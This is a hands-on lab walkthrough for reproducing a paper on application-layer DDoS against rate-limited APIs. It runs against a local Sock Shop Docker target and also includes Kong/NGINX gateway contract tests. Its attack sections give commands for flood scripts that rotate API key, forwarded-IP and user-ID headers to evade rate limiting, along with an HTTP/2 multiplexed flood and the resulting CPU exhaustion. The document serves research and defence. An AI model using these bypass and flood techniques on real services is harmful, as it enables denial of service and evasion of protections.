> **Separação do experimento original:** os caminhos `algorithms/`, `attacks/`, `setup/`, `monitoring/` e `results/` desta trilha agora partem de `lab/original_experiment/`. As seções sobre gateways e testes de contrato continuam partindo de `lab/`. Consulte o [README desta trilha](../README.md).

> [Índice de estudos](../../docs/README.md). Documento reorganizado em 20/10/2026; datas e resultados abaixo preservam o registro original. Caminhos em comandos continuam relativos ao diretório indicado no texto, não a esta pasta.

> Material de referência histórica. Para a arquitetura e as limitações conhecidas, comece pelo [mapa da aplicação](../../docs/study/APPLICATION_MAP.md). Afirmações antigas de equivalência, bypass ou saturação não substituem a medição experimental.

# Hands-on Walkthrough — Reproducing the Paper

This is the step-by-step tutorial for the lab.  Follow it top-to-bottom and
by the end you will have **(a) understood what each algorithm does**,
**(b) executed it against the live SockShop target**, **(c) measured the
CPU exhaustion on the server**, and **(d) confirmed the rate-limiter bypass
that the paper claims**.

Time budget: ~25 minutes if you've already pulled the Docker images, ~45
minutes for a cold start.  Add ~15 minutes if you also run the
[gateway plug-in tests](#2-gateway-plug-in-rate-limit-testing-kong--nginx)
(Section 2).

This walkthrough has **two tracks**:

| Track | Stack | Use when |
|-------|--------|----------|
| **Paper lab** (Sections 1, 3–11) | `setup/docker-compose.yml` | Reproducing Algorithms 1–5 and the paper's rate-limit *bypass* (§VI.B) |
| **Gateway plug-ins** (Section 2) | `gateways/` + `start.sh` | Verifying interchangeable Kong / NGINX gateways and IP-based rate limits |

Both expose HTTP on **8080** and TLS on **8443** on the host.  **Do not run
both stacks at once** — they bind the same ports.

---

## 0. Mental model

The paper says: *modern rate-limited APIs can still be DDoSed at the
application layer, because the rate-limiter trusts client-controlled
identifiers (`X-API-KEY`, IP, USER) and HTTP/2 multiplexing concentrates
load*.

Five algorithms work together to prove that:

```
┌──────────────────────────────────────────────────────────────────────┐
│  Algo 1   →   Algo 2   →   Algo 3 (sym)    Algo 4 (asym)    Algo 5  │
│  DISCOVER     PICK         flood the      mix endpoints,    HTTP/2  │
│  endpoints    heavy ones   same heavy     same heavy        multi-  │
│  (OAS+JS)     (latency+    endpoint       endpoints         plexed  │
│               error code)  many times     once each         streams │
└──────────────────────────────────────────────────────────────────────┘
                  ↓                ↓                ↓             ↓
            "what to hit"    "hammer it"     "evade by      "evade by
                              from many       variety"       single TCP +
                              clients                        N streams"
```

The three "evasion" attacks (3-5) all share **one trick**: they rotate the
`X-API-KEY`, `X-Forwarded-For`, and `X-User-Id` headers on every request, so
the gateway sees each call as belonging to a different bucket and never
trips the rate-limiter.

---

## 1. Bring the paper lab up (Section VI.B)

This is the stack **described in the paper**: Apache-style front door → API
gateway with three rate-limit dimensions (`X-API-KEY`, client IP,
`X-User-Id`) → Sock Shop microservices.  Algorithms 1–5 in this walkthrough
target **this** environment.

```bash
cd lab/original_experiment/setup
docker compose up -d --build         # ~3 min cold start
docker compose ps                    # should list 14 containers, all "Up"
```

Sanity-check the gateway:

```bash
curl -s http://localhost:8080/health
# → {"status":"UP"}

curl -i -H 'X-API-KEY: AX001-demo' http://localhost:8080/catalogue | head -2
# → HTTP/1.1 200 OK
```

### Confirm the rate-limiter actually works

Send 110 requests with the **same** `ZZ-`-prefix key (which falls into the
"other" bucket = 50/min):

```bash
for i in $(seq 1 110); do
  curl -sS -o /dev/null -w "%{http_code} " \
       -H 'X-API-KEY: ZZ-same' -H 'X-Forwarded-For: 9.9.9.9' \
       -H 'X-User-Id: same' http://localhost:8080/catalogue
done; echo
```

Expected output (confirmed in this lab):

```
200 200 200 ... 200 200    ← exactly 50 successes
429 429 429 ... 429 429    ← the next 60 are rate-limited
```

This is the **defence** the gateway provides.  Algorithms 3-5 below break it.

---

## 2. Gateway plug-in rate-limit testing (Kong / NGINX)

This section covers the **second** lab stack: Sock Shop behind a swappable
API gateway (Kong or NGINX) with a **single global limit** of 100 requests
per minute per client IP.  It is **not** the paper's multi-bucket gateway;
it exists so you can compare gateway implementations and prove they all
honour the same [plug-in contract](LEGACY_TECHNICAL_README.md#two-ways-to-start-the-lab)
without changing Sock Shop service code.

### 2.1 What you are testing

The automated suite in `tests/test_rate_limiting.py` checks that each
gateway plug-in:

| Requirement | How the test checks it |
|-------------|-------------------------|
| Listens on host **8080** (HTTP) | All HTTP traffic uses `http://127.0.0.1:8080` |
| Enforces **100 req/min per IP** | 90 requests → no `429`; 150 requests → at least one `429` |
| Returns **`Retry-After`** on `429` | Header present on a rate-limited response |
| Window **resets** after ~60 s | After hitting the limit, wait 61 s, 10 more requests succeed |
| **`GET /healthz` → 200** | Dedicated health test |

TLS is exposed on host **8443** (container port 443 for NGINX, 8443 for
Kong).  The pytest suite uses HTTP on 8080 only; you can sanity-check TLS
manually (see below).

### 2.2 Prerequisites

From the repository root:

```bash
cd lab
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

You also need Docker with permission to pull `nginx:1.27.0-alpine`,
`kong:3.7.1`, and the Weaveworks Sock Shop images (same as the paper lab).

**Important:** tear down the paper lab first if it is still running — both
stacks use ports 8080 and 8443:

```bash
cd lab/original_experiment/setup
docker compose down -v
```

### 2.3 Start a gateway plug-in

```bash
cd lab
API_GATEWAY=nginx ./start.sh          # default if API_GATEWAY is omitted
# API_GATEWAY=kong ./start.sh         # Kong OSS, DB-less declarative mode
```

`start.sh` merges `gateways/base/docker-compose.yml` with
`gateways/<name>/docker-compose.override.yml` and prints the active gateway.
On success you should see:

```
Starting Sock Shop with API gateway: nginx
Gateway HTTP/1.1: http://localhost:8080
Gateway TLS/HTTP2: https://localhost:8443
Health check: curl -s http://localhost:8080/healthz
```

Wait until the gateway answers (up to ~30 s on a cold start):

```bash
curl -s http://localhost:8080/healthz
# → {}   (or empty body) with HTTP 200

curl -sk https://localhost:8443/healthz
# → {}   with HTTP 200  (self-signed cert in gateways/tls/)
```

Optional — Kong with Redis-backed rate limiting:

```bash
API_GATEWAY=kong REDIS_URL=redis://redis:6379 ./start.sh
```

### 2.4 Run the pytest suite (single source of truth)

`tests/test_rate_limiting.py` is **gateway-agnostic**.  There are no
per-gateway test files and no gateway-conditional assertions.  The only
variable is `--gateway kong|nginx`.  A plug-in is valid only if it passes
all five cases with the same inputs and thresholds.

**Verify all plug-ins** (recommended — runs the full pipeline for each, then
compares results):

```bash
cd lab
source .venv/bin/activate

python3 tests/verify_gateways.py -v
```

This executes, **in order for each gateway**:

| Step | Action |
|------|--------|
| a | `API_GATEWAY=<name> ./start.sh` |
| b | Wait for `GET http://localhost:8080/healthz` → 200 |
| c | `pytest tests/test_rate_limiting.py --gateway <name> -v` |
| d | Require all five tests to pass |
| e | Write `tests/results/<name>_report.json` |
| f | `docker compose … down -v` |

Then it writes `tests/results/comparison_report.json` with
`"verdict": "equivalent"` only if every gateway passes every test with the
same pass/fail outcome.  Any mismatch sets `"verdict": "divergent"` and lists
the differing test names in `divergences`.

**Verify one gateway** manually:

```bash
pytest tests/test_rate_limiting.py --gateway nginx -v
```

What happens under the hood (each pytest session):

1. **Session fixture** (`tests/conftest.py`) calls `./start.sh` with
   `API_GATEWAY` set from `--gateway`.
2. Polls `http://127.0.0.1:8080/healthz` for up to **30 seconds**.
3. Runs the five test cases (under-limit, over-limit, `Retry-After`, reset,
   health).
4. Tears the stack down with `docker compose … down -v`.
5. Prints a **summary table** (gateway, test, pass/fail, latency p50/p95)
   and writes `tests/results/{gateway}_report.json` for CI.

If a gateway fails a test, **fix its configuration** — do not skip or weaken
the test suite.

Example summary (Kong):

```
Rate-limit test summary
gateway    test                     status      p50(ms)    p95(ms)
------------------------------------------------------------------
kong       test_under_limit         passed         2.85       4.08
kong       test_over_limit          passed         0.95       2.35
...
```

Inspect the JSON reports:

```bash
python3 -m json.tool tests/results/nginx_report.json
python3 -m json.tool tests/results/comparison_report.json
```

### 2.5 Manual spot-checks (optional)

These mirror what the tests assert without waiting for the full suite
(`test_limit_resets` sleeps **61 seconds**).

**Under the IP limit** (should stay non-429):

```bash
for i in $(seq 1 90); do
  curl -sS -o /dev/null -w "%{http_code} " http://localhost:8080/
done; echo
```

**Over the limit** (expect at least one `429` with `Retry-After`):

```bash
for i in $(seq 1 150); do
  curl -sS -o /dev/null -D - http://localhost:8080/ 2>/dev/null | head -1
done | sort | uniq -c
```

NGINX returns a JSON body on 429:

```json
{"error":"rate_limit_exceeded","retry_after":60}
```

### 2.6 Tear down the plug-in stack

If you started manually and pytest did not tear down:

```bash
cd lab
docker compose \
  --project-directory . \
  -f gateways/base/docker-compose.yml \
  -f gateways/nginx/docker-compose.override.yml \
  down -v --remove-orphans
# swap nginx → kong in the override path if needed
```

### 2.7 How this relates to the paper track

| | Paper lab (`setup/`) | Gateway plug-ins (`gateways/` + `start.sh`) |
|---|----------------------|---------------------------------------------|
| Rate-limit model | Per `X-API-KEY` prefix, IP, and `X-User-Id` | Global 100/min per client IP only |
| Goal of tests | Show **bypass** via header rotation (Algos 3–5) | Show gateways are **interchangeable** and enforce the contract |
| Health endpoint | `GET /health` | `GET /healthz` |
| Attack scripts | `algorithms/`, `attacks/` | `tests/test_rate_limiting.py` |

After finishing Section 2, continue with Section 3 to run the paper's
Algorithms 1–5 — but **bring `setup/` back up** (Section 1) and tear down
the plug-in stack first.

---

## 3. Algorithm 1 — Endpoint Discovery

**Goal**: enumerate every API route the target exposes, from two independent
sources (so we catch routes that aren't documented).

**What it does**:
1. Downloads the OpenAPI Specification (OAS) from `/v3/api-docs`.
2. Crawls the front-end's HTML + `<script>` tags.
3. Greps the JavaScript for `fetch(...)`, `axios.get(...)`, and URL string
   literals like `'/catalogue/{id}'`.
4. De-duplicates by `(METHOD, PATH)` and emits JSON.

**Run**:

```bash
cd lab/original_experiment
python3 algorithms/algorithm1_discover.py \
    --oas         http://localhost:8080/v3/api-docs \
    --client-root http://localhost:8080/ \
    --out         results/endpoints.json
```

**Expected output**:

```
[oas]    http://localhost:8080/v3/api-docs: 12 endpoints
[client] http://localhost:8080/: 8 endpoints
[done]   14 unique endpoints -> results/endpoints.json
```

**Inspect the JSON**:

```bash
python3 -c "
import json
for e in json.load(open('results/endpoints.json')):
    print(f\"{e['method']:6} {e['path']:30}  [{e['source'].split(':',1)[0]}]\")
"
```

You should see entries tagged `[oas]` and `[client]` — Algorithm 1 unified
them.

---

## 4. Algorithm 2 — Target Identification

**Goal**: among the 14 endpoints discovered, find the ones that are worth
attacking.  Two criteria:

1. **High latency** → these endpoints do real work on the backend
   (DB lookup, ordering pipeline, etc.).  Slamming them costs the server
   real CPU.
2. **Returns 429 / 503 / 509 / 520** under light load → these are
   already at the edge of resource saturation.

**What it does**: probes every endpoint 3 times with a *valid* request,
records p95 latency + status codes, returns top-N by latency ∪ everything
with overload status codes.

**Run**:

```bash
python3 -W ignore algorithms/algorithm2_identify.py \
    --endpoints results/endpoints.json \
    --base-url  http://localhost:8080 \
    --api-key   "AX001-probe" \
    --probes    3 \
    --top-n     5 \
    --out       results/targets.json
```

**Expected output** (this lab's actual run):

```
[1/14] probing GET  /a
[2/14] probing POST /addresses
...
[14/14] probing POST /register
[done] 10 target endpoints -> results/targets.json
```

**Inspect**:

```bash
python3 -c "
import json; d = json.load(open('results/targets.json'))
print('heavy by latency:')
for e in d['heavy_by_latency']:
    print(f\"  {e['method']:6} {e['path']:30}  p95={e['p95_ms']:>6.1f}ms\")
print('error-prone:')
for e in d['error_prone']:
    print(f\"  {e['method']:6} {e['path']:30}  statuses={e['statuses']}\")
"
```

You'll see `GET /orders` at the top — the slowest endpoint, because it
joins data across the orders microservice + Mongo.  **That's our prime
attack target**.

---

## 5. Start the target-side monitor (open in a second terminal!)

Before launching any attack, start sampling CPU and memory on the gateway
**and** on the busiest backend container in two more terminals:

```bash
# Terminal 2
bash monitoring/monitor.sh sockshop-gateway results/mon_gw.csv  1

# Terminal 3
bash monitoring/monitor.sh sockshop-orders  results/mon_ord.csv 1
```

These print nothing — they silently write one CSV row per second. Leave
them running until the last attack finishes.

---

## 6. Algorithm 3 — HTTP/1.1 Symmetric Attack

**Goal**: take the *single* heaviest endpoint (`GET /orders`) and fire the
same request at it from many parallel clients.

**Why it's effective despite the rate-limiter**:
- Each request gets a fresh random `X-API-KEY` (e.g. `AX001-X3l2`,
  `BX001-ah9q`, `ZZ000-pq2g`), a fresh `X-Forwarded-For`, and a fresh
  `X-User-Id` → the gateway sees N different "users", none of which exceed
  their personal 100-req/min budget.

### Python variant (httpx + multiprocessing)

```bash
python3 -W ignore attacks/algorithm3_symmetric.py \
    --target   results/targets.json \
    --base-url http://localhost:8080 \
    --clients  5 \
    --requests 500 \
    --out      results/sym_py.csv
```

**Expected output** (real numbers from this lab):

```json
{
  "clients": 5,
  "requests_per_client": 500,
  "total_requests": 2500,
  "wall_seconds": 1.7,
  "rps": ~1500,
  "status_breakdown": {
    "2xx": 2500,
    "overload_429_503_509_520": 0          ← bypass confirmed
  }
}
```

**Read this carefully**: we just fired ~1500 RPS against a server whose
combined rate-limit budget is 250 req/min (~4 RPS) for the most generous
bucket — and got **zero 429s**.

### CURL variant

```bash
bash attacks/algorithm3_symmetric.sh results/targets.json 100 3
```

Same observable behaviour, written from a Bash loop with `curl` — exactly
mirroring §VI.C.2 of the paper.

---

## 7. Algorithm 4 — HTTP/1.1 Asymmetric Attack

**Goal**: same as Algorithm 3, but instead of always hitting `/orders` we
*rotate among the entire 10-target list*, **mutating path params and query
strings** to make every request look unique.

**Why this matters**:  even a smart rate-limiter that compares URL paths
won't match consecutive requests, because we keep injecting
`?_n=ax42`-style noise tokens.

### Python variant

```bash
python3 -W ignore attacks/algorithm4_asymmetric.py \
    --target   results/targets.json \
    --base-url http://localhost:8080 \
    --clients  5 \
    --requests 500 \
    --out      results/asym_py.csv
```

Expected: ~2100 RPS, 0 × 429.  The 4xx/5xx counts are higher than Algorithm
3 because some routes legitimately reject the mutated payloads — but that
**doesn't matter for the attack**: the server still spent CPU parsing /
authenticating / routing each one.

### CURL variant

```bash
bash attacks/algorithm4_asymmetric.sh results/targets.json 100 3
```

---

## 8. Algorithm 5 — HTTP/2 Multiplexed Attack

**Goal**: same load, but riding the gateway's TLS/HTTP-2 endpoint with
**N concurrent streams over a SINGLE TCP connection per client**.

**Why this is the strongest attack**:
- HTTP/2 multiplexing means our gateway sees a single physical client
  pushing 200 in-flight requests over one socket.  Frame-level RL is
  almost never enforced.
- Apache/Tomcat must allocate one worker thread per stream → CPU pressure
  scales as `clients × streams`.
- The paper proves this at Table VII: HTTP/2 + 15 clients = 95 % CPU.

**Run the fixed implementation**:

```bash
cd attacks/
go run algorithm5_http2_mux_fixed.go \
    -target       https://localhost:8443 \
    -targets-file ../results/targets.json \
    -clients  5 \
    -requests 500 \
    -streams  200 \
    -insecure                       # lab uses a self-signed cert
cd ..
```

**Expected output** (real numbers):

```
[+] HTTP/2 multiplexed attack fixed | base=https://localhost:8443 | clients=5 | reqs/c=500 | streams/c=200 | symmetric=true
[+] done in 2.372s | total=2500 | ~1053.8 rps | csv=../results/h2mux_fixed_*.csv
```

**Where the log lands**: every run drops a new CSV in `lab/original_experiment/results/h2mux_fixed_<timestamp>.csv`
(same folder as the Python / CURL attacks).  The Go binary automatically
detects whether you launched it from `attacks/` or from the lab root and
picks the right folder.  Override with `-out path/to/file.csv` or
`LAB_RESULTS=/some/dir go run ...`.

`algorithm5_http2_mux.go` is still present as the original implementation.
Prefer `algorithm5_http2_mux_fixed.go` for new runs: it removes the shared
`math/rand.Rand` race between stream goroutines, keeps each worker pinned to
one HTTP/2 connection with `StrictMaxConcurrentStreams`, validates numeric
flags, handles Ctrl-C through context cancellation, and normalizes target
URLs before issuing requests.

**Inspect the log**:

```bash
python3 << 'PY'
import csv, glob
from collections import Counter
latest = max(glob.glob('results/h2mux_fixed_*.csv'))
rows = list(csv.DictReader(open(latest)))
print(f"file: {latest}  rows: {len(rows)}")
print('statuses :', dict(Counter(r['status'] for r in rows).most_common()))
lats = [float(r['latency_ms']) for r in rows
        if r['status'].lstrip('-').isdigit() and int(r['status']) > 0]
print(f"latency  : min={min(lats):.1f}  avg={sum(lats)/len(lats):.1f}  max={max(lats):.1f} ms")
print('paths    :', dict(Counter(r['path'] for r in rows).most_common(3)))
PY
```

Latency distribution will be **dramatically wider** than Algorithm 3:

```
HTTP/1.1 symmetric:  min=3ms   avg=8ms     max=21ms
HTTP/2  multiplex :  min=17ms  avg=403ms   max=1149ms
```

The 50× latency blow-up is the multiplexing effect concentrating load on
the server — exactly the §V.D.2 prediction.

---

## 9. Validating the attack worked

Stop the monitors (Ctrl-C in their terminals) and analyse the CSVs:

```bash
python3 << 'PY'
import csv
for label, path in [("GATEWAY", "results/mon_gw.csv"),
                    ("ORDERS ", "results/mon_ord.csv")]:
    rows = list(csv.DictReader(open(path)))
    cpu = sorted(float(r['cpu_percent']) for r in rows if r['cpu_percent'])
    if not cpu: continue
    print(f"{label}  samples={len(cpu):3}  "
          f"min={cpu[0]:.1f}  median={cpu[len(cpu)//2]:.1f}  "
          f"p95={cpu[int(0.95*len(cpu))-1]:.1f}  max={cpu[-1]:.1f}%")
PY
```

**Expected** (this lab's real result at 5×500):

```
GATEWAY  samples=5  min=0.1  median=36.8  p95=37.8  max=77.1%
ORDERS   samples=5  min=0.1  median=144.8 p95=343.9 max=545.6%
```

That `545.6 %` on `sockshop-orders` is Docker reporting **multi-core**
utilisation: the Java/Tomcat container burnt ≈ 5.5 cores at peak.  At the
paper's full scale (`15 × 2000`) you'll saturate the host.

**You have just reproduced the vulnerability.**

---

## 10. Reproducing each paper table

Each table in the paper is just a re-run of the same algorithm at
different `--clients` × `--requests` settings:

| Table | Run                                                  |
|-------|-----------------------------------------------------|
| II    | `algorithm3_symmetric.py --clients 1  --requests N` |
| III   | `algorithm3_symmetric.sh _ N 1`                      |
| IV    | `algorithm3_symmetric.sh _ N 5`                      |
| V     | `algorithm3_symmetric.sh _ N 15`                     |
| VI    | `algorithm5_http2_mux_fixed.go  -clients 1  -requests N`  |
| VII   | `algorithm5_http2_mux_fixed.go  -clients 5|15 -requests N` |
| VIII  | `algorithm4_asymmetric.sh _ N 1`                     |
| IX    | `algorithm4_asymmetric.sh _ N 15` + Algo 5 15 N      |

Loop over `N ∈ {500, 1000, 1500, 2000}` for each row.  Pipe the CSVs into
matplotlib or gnuplot to redraw Fig. 3 and Fig. 4 of the paper.

A pre-built one-shot orchestrator that does the symmetric/asymmetric/h2
sweep is available:

```bash
./run_lab.sh http://localhost:8080 2000 15
```

This is what produces the full reproduction at paper scale.

---

## 11. Cleaning up

```bash
# stop monitors (in their terminals): Ctrl-C
# kill any background workers we left:
pkill -f algorithm  ||  true

# paper lab (Section 1):
cd lab/original_experiment/setup
docker compose down -v

# gateway plug-in stack (Section 2), if still running:
cd lab
docker compose --project-directory . \
  -f gateways/base/docker-compose.yml \
  -f gateways/nginx/docker-compose.override.yml \
  down -v --remove-orphans
```

`docker compose down -v` wipes the SockShop DBs too, so a re-run starts
from a clean catalogue/orders/users state.

---

## What to do next

1. **Plot the CPU CSVs** in your favourite tool to visually match Fig. 3.
2. **Add a gateway plug-in**: follow Section 2 and `README.md` to implement
   a third gateway, then run `pytest tests/test_rate_limiting.py --gateway <name>`.
3. **Try defending**: edit `setup/gateway/ratelimit.lua` to add a fourth
   policy (e.g. "if the X-API-KEY has never been seen before, allow only 10
   req/min until it's verified") and re-run Algorithms 3-5.  Does the
   attack still succeed?  At what request rate?
4. **Try HTTP/3**: the paper's §VIII calls this out as future work.  Swap
   the gateway image for `apache/curl-http3` or `nghttp3` and rewrite
   Algorithm 5 with the QUIC stack.
5. **Add anomaly detection**: tap `docker logs sockshop-gateway` into a
   small ML classifier (one feature = "Jaccard distance between consecutive
   `X-API-KEY` values per IP") and verify the attack patterns become
   detectable.
